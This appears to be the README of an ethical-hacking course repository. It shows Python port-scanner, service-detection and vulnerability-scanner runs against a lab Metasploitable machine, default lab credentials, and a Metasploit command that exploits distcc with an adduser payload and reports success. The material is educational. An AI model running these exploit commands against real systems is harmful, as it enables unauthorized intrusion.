# Pentest


## Learn Python & Ethical Hacking 

---
* <a href="Tutorial.md">Tutorial.md</a>
---
#### Mind map
* <a href="EH_2023_part_1.drawio.svg">EH_2023_part_1.drawio.svg</a>
* <a href="EH_2023_part_2_DVWA.drawio.svg">EH_2023_part_2_DVWA.drawio.svg</a>
* <a href="EH_2023_part_3_WIFI.drawio.svg">EH_2023_part_3_WIFI.drawio.svg</a>
* <a href="EH_2023_part_4_ANDROID.drawio.svg">EH_2023_part_4_ANDROID.drawio.svg</a>

---
## Device information:

  ```shell
  ifconfig
  ```

  ```shell
  ip -c a
  ```
  
  ```shell
  arp -a
  ```
  
  Windows  
  ```shell
  ipconfig /all
  ```
---
## Security Metasploitable

```
Login:password - msfadmin:msfadmin

msfadmin@metasploitable: cd /var/www/dvwa/dvwa/includes/
msfadmin@metasploitable: sudo nano dvwaPage.inc.php

setcookie( 'security', 'medium' )
```
```
http://10.0.2.4/dvwa/security.php

Username: admin
Security Level: low
```

---

## scripts

1. <a href="#port_scanner">Port Scanner</a>
2. <a href="#exploits_and_payloads">Exploits and Payloads</a>
3. <a href="#vulnerability_scanner">Vulnerability Scanner</a>



---

1. **Port Scanner** <a name="port_scanner"></a>  

    ```pycon
    cd 1_port_scan
    ```
    
    ```pycon
    ┌──(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/1_port_scan]
    └─$ python3 port_scanner_1.py -t 10.0.2.4 -p 100
    
    ```
    
    Some servers may consider such requests as a hacking attempt and block your IP address:
    ```pycon
    ┌──(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/1_port_scan]
    └─$ python3 port_scanner_2.py -t 10.0.2.1,10.0.2.4 -p 100
    
    ```

2. **Exploits and Payloads** <a name="exploits_and_payloads"></a>  

    ```pycon
    cd 2_exploits_and_payloads
    ```
   
   ```pycon
   ┌──(venv_EH)─(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
   └─$ sudo python service_info_3.py 
   [sudo] пароль для kali: 
   {'PORT': '21/tcp', 'STATE': 'open', 'SERVICE': 'ftp', 'VERSION': 'vsftpd 2.3.4'}
   ```

   ```pycon
   ┌──(venv_EH)─(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
   └─$ python3 get_exploits_MSF.py
   ```
   
   ```pycon
   ┌──(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/2_exploits_and_payloads]
   └─$ python MSF_exploits_and_payloads_1.py
   
   Trying exploit:  exploit/unix/misc/distcc_exec
   Trying payload:  payload/cmd/unix/adduser
   Trying command:  msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/adduser; set RHOSTS 10.0.2.4; set RPORT 3632; set LHOST 10.0.2.5; check; exit"
   [+] Successful exploitation:  exploit/unix/misc/distcc_exec, Payload: payload/cmd/unix/adduser
   - - - - - - - - - - - - - - - - - - - - 
   ```
   

---

1. **Vulnerability Scanner** <a name="vulnerability_scanner"></a>

    ```pycon
    cd 3_vulnerability_scanner
    ```
   ```pycon
   ┌──(kali㉿kali)-[~/PycharmProjects/Complete_EH_Bootcamp_Zero_to_Mastery/3_vulnerability_scanner]
   └─$ python3 run_scanner.py
   
   ```
   ![run_vulnerability_scanner.gif](animation_gif%2Frun_vulnerability_scanner.gif)


